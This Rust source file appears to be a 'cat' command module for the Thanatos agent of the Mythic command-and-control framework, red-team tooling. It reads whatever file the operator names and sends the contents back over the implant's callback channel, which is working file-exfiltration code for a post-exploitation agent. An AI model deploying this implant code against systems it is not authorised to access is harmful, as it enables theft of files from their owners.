use serde::Deserialize;
use thanatos_module::{send_data, Callback, MythicStatus};

#[derive(Deserialize)]
struct CatArgs {
    file: String,
}

#[thanatos_module::entrypoint]
fn entrypoint(parameters: Option<String>) {
    let params = match parameters {
        Some(v) => v,
        None => {
            send_data(
                MythicStatus::Error,
                Callback::Output,
                b"Failed to get parameters.",
            )
            .unwrap();
            return;
        }
    };

    let params: CatArgs = match serde_json::from_str(&params) {
        Ok(v) => v,
        Err(_) => {
            send_data(
                MythicStatus::Error,
                Callback::Output,
                b"Failed to parse arguments.",
            )
            .unwrap();
            return;
        }
    };

    match std::fs::read_to_string(params.file) {
        Ok(data) => send_data(MythicStatus::Success, Callback::Output, data.as_bytes()).unwrap(),
        Err(e) => send_data(
            MythicStatus::Error,
            Callback::Output,
            e.to_string().as_bytes(),
        )
        .unwrap(),
    }
}
